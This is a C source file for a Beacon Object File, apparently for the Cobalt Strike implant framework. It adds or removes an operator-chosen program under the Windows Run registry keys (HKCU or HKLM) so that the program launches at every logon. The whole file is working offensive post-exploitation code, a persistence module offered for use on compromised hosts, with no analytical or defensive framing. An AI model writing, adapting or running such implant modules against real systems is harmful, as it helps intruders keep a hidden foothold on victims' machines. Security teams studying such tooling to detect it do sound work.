#include <windows.h>
#include <stdio.h>
#include "../_include/beacon.h"

// Registry Run Keys Persistence
// Adds a program to registry run keys for persistence

DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegSetValueExA(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegCloseKey(HKEY hKey);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegDeleteValueA(HKEY hKey, LPCSTR lpValueName);
DECLSPEC_IMPORT int __cdecl MSVCRT$strlen(const char *str);

#ifdef BOF
void go(char *args, int len)
{
    datap parser;
    BeaconDataParse(&parser, args, len);
    
    int action = BeaconDataInt(&parser);  // 0 = add, 1 = remove
    int location = BeaconDataInt(&parser);  // 0 = HKCU, 1 = HKLM
    CHAR* valueName = BeaconDataExtract(&parser, NULL);
    CHAR* programPath = BeaconDataExtract(&parser, NULL);
    
    HKEY rootKey = (location == 0) ? HKEY_CURRENT_USER : HKEY_LOCAL_MACHINE;
    const char* rootKeyName = (location == 0) ? "HKCU" : "HKLM";
    const char* subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Registry Run Keys Persistence\n");
    
    HKEY hKey;
    LONG result = ADVAPI32$RegOpenKeyExA(rootKey, subKey, 0, KEY_SET_VALUE | KEY_QUERY_VALUE, &hKey);
    
    if (result != ERROR_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to open registry key: %s\\%s\n", rootKeyName, subKey);
        BeaconPrintf(CALLBACK_ERROR, "[-] Error code: %d\n", result);
        return;
    }
    
    if (action == 0)  // Add persistence
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Adding persistence entry...\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Key: %s\\%s\n", rootKeyName, subKey);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Value: %s\n", valueName);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Path: %s\n", programPath);
        
        result = ADVAPI32$RegSetValueExA(
            hKey,
            valueName,
            0,
            REG_SZ,
            (const BYTE*)programPath,
            MSVCRT$strlen(programPath) + 1
        );
        
        if (result == ERROR_SUCCESS)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully added registry persistence\n");
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Program will run at user logon\n");
        }
        else
        {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to set registry value\n");
            BeaconPrintf(CALLBACK_ERROR, "[-] Error code: %d\n", result);
        }
    }
    else  // Remove persistence
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Removing persistence entry...\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Key: %s\\%s\n", rootKeyName, subKey);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Value: %s\n", valueName);
        
        result = ADVAPI32$RegDeleteValueA(hKey, valueName);
        
        if (result == ERROR_SUCCESS)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully removed registry persistence\n");
        }
        else if (result == ERROR_FILE_NOT_FOUND)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Registry value not found (may already be removed)\n");
        }
        else
        {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to delete registry value\n");
            BeaconPrintf(CALLBACK_ERROR, "[-] Error code: %d\n", result);
        }
    }
    
    ADVAPI32$RegCloseKey(hKey);
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Registry operation completed\n");
}
#endif

